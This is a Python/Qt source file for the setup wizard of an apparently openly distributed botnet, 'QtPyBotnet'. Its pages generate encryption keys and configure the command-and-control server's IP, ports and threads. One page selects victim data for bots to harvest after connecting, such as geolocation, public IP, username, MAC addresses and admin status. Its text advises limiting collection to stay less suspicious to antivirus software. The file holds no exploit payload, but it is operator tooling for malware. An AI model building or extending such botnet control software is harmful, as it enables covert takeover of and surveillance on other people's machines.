from qtpy.QtWidgets import (QWidget, QVBoxLayout, QTextEdit, QCheckBox, QPushButton, QLineEdit,
                            QFormLayout, QLabel, QApplication, QSpinBox, QListView, QSizePolicy, QSpacerItem)
from qtpy.QtCore import (Signal, Qt, QMetaObject, Slot, QSize, QVariant)
from qtpy.QtGui import QTextOption, QStandardItemModel, QStandardItem

import os
import sys
from socket import gethostname, gethostbyname

from core.config import ConfigManager
from core.crypto import generate_key


class ConfigBaseFrame(QWidget):
    accepted = Signal()
    rejected = Signal()
    set_next_enabled = Signal(bool)

    def __init__(self, parent=None):
        super(ConfigBaseFrame, self).__init__(parent)
        self.setMinimumSize(QSize(800, 500))
        self.disable_next_on_enter = False


class TermsFrame(ConfigBaseFrame):

    def __init__(self, parent=None):
        super(TermsFrame, self).__init__(parent)
        self.setObjectName("botnet_termsframe_start")
        self.disable_next_on_enter = True

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.terms = QTextEdit(self)
        self.terms.setReadOnly(True)
        self.terms.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        self.terms.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.terms.setLineWrapMode(QTextEdit.WidgetWidth)
        self.terms.setWordWrapMode(QTextOption.WrapAnywhere)
        with open(os.path.join(sys.path[0], "../LICENSE")) as f:
            self.terms.setText(f.read())
        self.widget_layout.addWidget(self.terms)

        self.accept = QCheckBox(self)
        self.accept.setChecked(False)
        self.accept.setText("Accept license")
        self.accept.setObjectName("license_checkbox")
        self.widget_layout.addWidget(self.accept)

        QMetaObject.connectSlotsByName(self)

    @Slot(bool)
    def on_license_checkbox_clicked(self, checked):
        self.set_next_enabled.emit(checked)
        self.disable_next_on_enter = not checked

    @Slot()
    def collect_info(self):
        return {"terms_accepted": self.accept.isChecked()}


class KeyFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(KeyFrame, self).__init__(parent)

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.key_label = QLabel(self)
        self.key_label.setWordWrap(True)
        self.key_label.setText("The key encrypting the traffic between the C2 server and the bot will be saved in "
                               "the configuration file. To increase security, the application configuration has been "
                               "encrypted using another key. Copy this encryption key and save in secret place. If you "
                               "lose this key, you will not be able to control your bots anymore. You will have to "
                               "provide this key every time you start C2 server.")
        self.widget_layout.addWidget(self.key_label)

        self.key_edit = QTextEdit(self)
        self.key_edit.setReadOnly(True)
        self.key_edit.setText(generate_key().decode())
        self.widget_layout.addWidget(self.key_edit)

        self.copy_btn = QPushButton(self)
        self.copy_btn.setText("Copy")
        self.copy_btn.setObjectName("copy_btn")
        self.widget_layout.addWidget(self.copy_btn)

        QMetaObject.connectSlotsByName(self)

    @Slot()
    def on_copy_btn_clicked(self):
        clipboard = QApplication.clipboard()
        clipboard.clear(mode=clipboard.Clipboard)
        clipboard.setText(self.key_edit.toPlainText(), mode=clipboard.Clipboard)

    @Slot()
    def collect_info(self):
        return {"config_key": self.key_edit.toPlainText()}


class GUIFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(GUIFrame, self).__init__(parent)
        self._key = generate_key().decode()

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.gui_conf_label = QLabel(self)
        self.gui_conf_label.setText("GUI server configuration")
        self.widget_layout.addWidget(self.gui_conf_label)

        self.desc_label = QLabel(self)
        self.desc_label.setWordWrap(True)
        self.desc_label.setText("QtPyBotnet GUI if fully remote. This means that you can connect to C2 server and "
                                "manage bot wherever you are. To authenticate when connecting to server use the key "
                                "below. Note that this key is diffrent from configuration key.")
        self.widget_layout.addWidget(self.desc_label)

        self.gui_config = QWidget(self)
        self.gui_config_layout = QFormLayout(self.gui_config)
        self.gui_config_layout.setObjectName("gui_config_layout")
        self.widget_layout.addWidget(self.gui_config)

        self.gui_ip_label = QLabel(self.gui_config)
        self.gui_ip_label.setObjectName("gui_ip_label")
        self.gui_ip_label.setText("GUI IP Address")
        self.gui_config_layout.setWidget(0, QFormLayout.LabelRole, self.gui_ip_label)

        self.gui_ip_line_edit = QLineEdit(self.gui_config)
        self.gui_ip_line_edit.setObjectName("gui_ip_line_edit")
        self.gui_ip_line_edit.setText(gethostbyname(gethostname()))
        self.gui_config_layout.setWidget(0, QFormLayout.FieldRole, self.gui_ip_line_edit)

        self.gui_port_label = QLabel(self.gui_config)
        self.gui_port_label.setObjectName("gui_port_label")
        self.gui_port_label.setText("GUI Port")
        self.gui_config_layout.setWidget(1, QFormLayout.LabelRole, self.gui_port_label)

        self.gui_port_edit = QSpinBox(self.gui_config)
        self.gui_port_edit.setObjectName("gui_port_spin")
        self.gui_port_edit.setRange(1024, 65535)
        self.gui_port_edit.setValue(15692)
        self.gui_config_layout.setWidget(1, QFormLayout.FieldRole, self.gui_port_edit)

        self.gui_key_label = QLabel(self.gui_config)
        self.gui_key_label.setObjectName("gui_key_label")
        self.gui_key_label.setText("GUI encryption key")
        self.gui_config_layout.setWidget(4, QFormLayout.LabelRole, self.gui_key_label)

        self.gui_key_edit = QLineEdit(self.gui_config)
        self.gui_key_edit.setObjectName("gui_key_edit")
        self.gui_key_edit.setReadOnly(True)
        self.gui_key_edit.setText(self._key)
        self.gui_config_layout.setWidget(4, QFormLayout.FieldRole, self.gui_key_edit)

        self.gmaps_key_label = QLabel(self.gui_config)
        self.gmaps_key_label.setObjectName("gmaps_key_label")
        self.gmaps_key_label.setText("Google Maps API key")
        self.gui_config_layout.setWidget(5, QFormLayout.LabelRole, self.gmaps_key_label)

        self.gmap_key_edit = QLineEdit(self.gui_config)
        self.gmap_key_edit.setObjectName("gmap_key_edit")
        self.gui_config_layout.setWidget(5, QFormLayout.FieldRole, self.gmap_key_edit)

        self.gui_valid_config_label = QLabel(self.gui_config)
        self.gui_valid_config_label.setObjectName("gui_valid_config_label")
        self.gui_valid_config_label.setText("Valid config")
        self.gui_config_layout.setWidget(6, QFormLayout.LabelRole, self.gui_valid_config_label)

        self.gui_valid_config_text = QLabel(self.gui_config)
        self.gui_valid_config_text.setObjectName("gui_valid_config_text")
        self.gui_valid_config_text.setText("TODO")
        self.gui_config_layout.setWidget(6, QFormLayout.FieldRole, self.gui_valid_config_text)

        spacerItem = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.widget_layout.addItem(spacerItem)

    @Slot()
    def collect_info(self):
        return {"gui_ip": self.gui_ip_line_edit.text(),
                "gui_port": int(self.gui_port_edit.text()),
                "gmaps_key": self.gmap_key_edit.text(),
                "gui_key": self._key}


class ServerFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(ServerFrame, self).__init__(parent)
        self._key = generate_key().decode()
        # self.disable_next_on_enter = True

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.c2_conf_label = QLabel(self)
        self.c2_conf_label.setText("C2 server configuration")
        self.widget_layout.addWidget(self.c2_conf_label)

        self.desc_label = QLabel(self)
        self.desc_label.setWordWrap(True)
        self.desc_label.setText("Make sure that port you use is opened and IP address is "
                                "valid. To balance server load, select amount of threads to use. Set 0 to use all "
                                "available system cores. Before proceeding you have to validate settings.")
        self.widget_layout.addWidget(self.desc_label)

        self.ip_config = QWidget(self)
        self.ip_config_layout = QFormLayout(self.ip_config)
        # self.ip_config_layout.setContentsMargins(0, 0, 0, 0)
        self.ip_config_layout.setObjectName("ip_config_layout")
        self.widget_layout.addWidget(self.ip_config)

        self.ip_label = QLabel(self.ip_config)
        self.ip_label.setObjectName("ip_label")
        self.ip_label.setText("C2 IP Address")
        self.ip_config_layout.setWidget(0, QFormLayout.LabelRole, self.ip_label)

        self.ip_line_edit = QLineEdit(self.ip_config)
        self.ip_line_edit.setObjectName("ip_line_edit")
        self.ip_line_edit.setText("127.0.0.1")
        self.ip_config_layout.setWidget(0, QFormLayout.FieldRole, self.ip_line_edit)

        self.port_label = QLabel(self.ip_config)
        self.port_label.setObjectName("port_label")
        self.port_label.setText("C2 Port")
        self.ip_config_layout.setWidget(1, QFormLayout.LabelRole, self.port_label)

        self.port_edit = QSpinBox(self.ip_config)
        self.port_edit.setObjectName("port_spin")
        self.port_edit.setRange(1024, 65535)
        self.port_edit.setValue(8192)
        self.ip_config_layout.setWidget(1, QFormLayout.FieldRole, self.port_edit)

        self.alt_port_label = QLabel(self.ip_config)
        self.alt_port_label.setObjectName("alt_port_label")
        self.alt_port_label.setText("C2 Alternative port")
        self.ip_config_layout.setWidget(2, QFormLayout.LabelRole, self.alt_port_label)

        self.alt_port_edit = QSpinBox(self.ip_config)
        self.alt_port_edit.setObjectName("alt_port_spin")
        self.alt_port_edit.setRange(1024, 65535)
        self.alt_port_edit.setValue(1337)
        self.ip_config_layout.setWidget(2, QFormLayout.FieldRole, self.alt_port_edit)

        self.threads_label = QLabel(self.ip_config)
        self.threads_label.setObjectName("threads_label")
        self.threads_label.setText("C2 handler threads")
        self.ip_config_layout.setWidget(3, QFormLayout.LabelRole, self.threads_label)

        self.threads_edit = QSpinBox(self.ip_config)
        self.threads_edit.setObjectName("threads_edit")
        self.threads_edit.setRange(0, 256)
        self.ip_config_layout.setWidget(3, QFormLayout.FieldRole, self.threads_edit)

        self.c2_key_label = QLabel(self.ip_config)
        self.c2_key_label.setObjectName("c2_key_label")
        self.c2_key_label.setText("C2 encryption key")
        self.ip_config_layout.setWidget(4, QFormLayout.LabelRole, self.c2_key_label)

        self.c2_key_edit = QLineEdit(self.ip_config)
        self.c2_key_edit.setObjectName("c2_key_edit")
        self.c2_key_edit.setEchoMode(QLineEdit.Password)
        self.c2_key_edit.setReadOnly(True)
        self.c2_key_edit.setText(self._key)
        self.ip_config_layout.setWidget(4, QFormLayout.FieldRole, self.c2_key_edit)

        self.valid_config_label = QLabel(self.ip_config)
        self.valid_config_label.setObjectName("valid_config_label")
        self.valid_config_label.setText("Valid config")
        self.ip_config_layout.setWidget(5, QFormLayout.LabelRole, self.valid_config_label)

        self.valid_config_text = QLabel(self.ip_config)
        self.valid_config_text.setObjectName("valid_config_text")
        self.valid_config_text.setText("TODO")
        self.ip_config_layout.setWidget(5, QFormLayout.FieldRole, self.valid_config_text)

        spacerItem = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.widget_layout.addItem(spacerItem)

    #         TODO: Add validator, check if selected ports are forwaded
    #     self.ip_line_edit.textChanged.connect(self.on_value_changed)
    #     self.port_edit.valueChanged.connect(self.on_value_changed)
    #     self.alt_port_edit.valueChanged.connect(self.on_value_changed)
    #     self.threads_edit.valueChanged.connect(self.on_value_changed)
    #     self.on_value_changed()
    #
    # @Slot()
    # def on_value_changed(self):
    #     if self._validate():
    #         self.valid_config_text.setStyleSheet("color: green;")
    #         self.valid_config_text.setText("Vaild")
    #         self.disable_next_on_enter = True
    #         self.set_next_enabled.emit(True)
    #     else:
    #         self.valid_config_text.setStyleSheet("color: red;")
    #         self.valid_config_text.setText("Invalid")
    #         self.disable_next_on_enter = False
    #         self.set_next_enabled.emit(False)
    #
    # def _validate(self):
    #     try:
    #         ip_address(self.ip_line_edit.text())
    #     except ValueError:
    #         return False
    #     if self.port_edit.value() not in range(1024, 65536):
    #         return False
    #     if self.alt_port_edit.value() not in range(1024, 65536):
    #         return False
    #     if self.alt_port_edit.value() == self.port_edit.value():
    #         return False
    #     return True

    @Slot()
    def collect_info(self):
        return {"c2_ip": self.ip_line_edit.text(),
                "c2_port": int(self.port_edit.text()),
                "c2_alternative_port": int(self.alt_port_edit.text()),
                "c2_threads": int(self.threads_edit.value()),
                "c2_key": self._key}


class InfoFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(InfoFrame, self).__init__(parent)

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.section_label = QLabel(self)
        self.section_label.setText("Informations")
        self.widget_layout.addWidget(self.section_label)

        self.label = QLabel(self)
        self.label.setText("Select information to collect after successfull connection. Keep in mind that the more "
                           "data you collect the more suspicious you are for antivirus software. You can "
                           "change these settings later.")
        self.label.setWordWrap(True)
        self.widget_layout.addWidget(self.label)

        self.list = QListView(self)
        self.model = QStandardItemModel(self.list)
        self.widget_layout.addWidget(self.list)
        self.list.setModel(self.model)

        self.item_string = {"geolocation": {"name": "Geolocation", "checked": True, "checkable": False,
                                            "description": "Bot location."},
                            "public_ip": {"name": "Public IP address", "checked": True, "checkable": True,
                                          "description": "Bot public IP address."},
                            "platform": {"name": "Platform", "checked": True, "checkable": True,
                                         "description": "Installed OS. Can be Linux, Windows, Darwin."},
                            "architecture": {"name": "Device CPU architecture", "checked": True, "checkable": True,
                                             "description": "CPU architecture"},
                            "system_architecture": {"name": "System architecture", "checked": False, "checkable": True,
                                                    "description": "Installed OS architecture."},
                            "administrator": {"name": "Administrator", "checked": True, "checkable": False,
                                              "description": "If bot process has administrator privileges."},
                            "language": {"name": "System language", "checked": True, "checkable": True,
                                         "description": "System default language."},
                            "local_ips": {"name": "Local IP addresses", "checked": False, "checkable": True,
                                          "description": "IP addresses of all NICs installed in device."},
                            "mac_addresses": {"name": "MAC addresses", "checked": False, "checkable": True,
                                              "description": "MAC addresses of all NICs installed in device."},
                            "username": {"name": "Username", "checked": True, "checkable": True,
                                         "description": "Current user name"},
                            }

        for string in self.item_string:
            item = QStandardItem(self.item_string.get(string).get("name"))
            if self.item_string.get(string).get("checkable"):
                item.setFlags(Qt.ItemIsUserCheckable | Qt.ItemIsEnabled)
                item.setToolTip(self.item_string.get(string).get("description"))
            else:
                item.setFlags(~Qt.ItemIsUserCheckable | Qt.ItemIsEnabled)
                item.setToolTip(self.item_string.get(string).get("description") + " This setting can not be changed.")
            if self.item_string.get(string).get("checked"):
                item.setData(QVariant(Qt.Checked), Qt.CheckStateRole)
            else:
                item.setData(QVariant(Qt.Unchecked), Qt.CheckStateRole)
            self.model.appendRow(item)

    @Slot()
    def collect_info(self):
        infos = []
        for info in self.item_string:
            item = self.model.findItems(self.item_string.get(info).get("name"))[0]
            if item.checkState() == Qt.Checked:
                infos.append(info)

        return {"after_connection_infos":  infos}


class FinishFrame(ConfigBaseFrame):

    def __init__(self, parent=None):
        super(FinishFrame, self).__init__(parent)
        self.setMinimumSize(QSize(0, 0))

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.finish_text = QLabel(self)
        self.finish_text.setWordWrap(True)
        self.finish_text.setText("Setup finished. You can start tutorial or close this window. Happy hacking :)")
        self.widget_layout.addWidget(self.finish_text)

        self.tutorial_button = QCheckBox(self)
        self.tutorial_button.setObjectName("tutorial_button")
        self.tutorial_button.setText("Start tutorial")
        self.tutorial_button.setEnabled(False)
        self.widget_layout.addWidget(self.tutorial_button)

    @Slot()
    def collect_info(self):
        return {"start_tutorial": self.tutorial_button.isChecked()}
